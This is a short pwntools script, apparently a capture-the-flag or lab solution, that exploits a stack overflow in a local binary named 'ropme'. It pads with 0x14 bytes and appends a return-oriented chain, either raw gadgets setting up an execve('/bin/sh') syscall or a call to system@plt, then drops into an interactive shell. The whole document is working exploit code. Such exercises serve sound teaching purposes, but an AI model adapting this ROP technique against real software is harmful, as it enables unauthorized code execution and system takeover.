from pwn import *
context.log_level = 'ERROR'

''' Shellcode Style '''
def shellcode():
    exploit = p32(0x0804832d)   # pop ebx; ret
    exploit += p32(0x0804a024)  # &('/bin/sh')
    exploit += p32(0x080484b5)  # xor ecx, ecx; ret
    exploit += p32(0x080484b8)  # xor edx, edx; ret
    exploit += p32(0x080484bb)  # mov eax, 0xb; int 0x80

    return exploit

''' System PLT '''
def system_plt():
    exploit = p32(0x080484e3)   # system @ plt
    exploit += p32(0x0804a024)  # &('/bin/sh')

    return exploit

p = process('./ropme')

payload = b'A' * 0x14
payload += shellcode() if (args.SHELLCODE) else system_plt()

p.sendlineafter(b'It\'s time to ROP!\n', payload)

p.interactive()
p.close()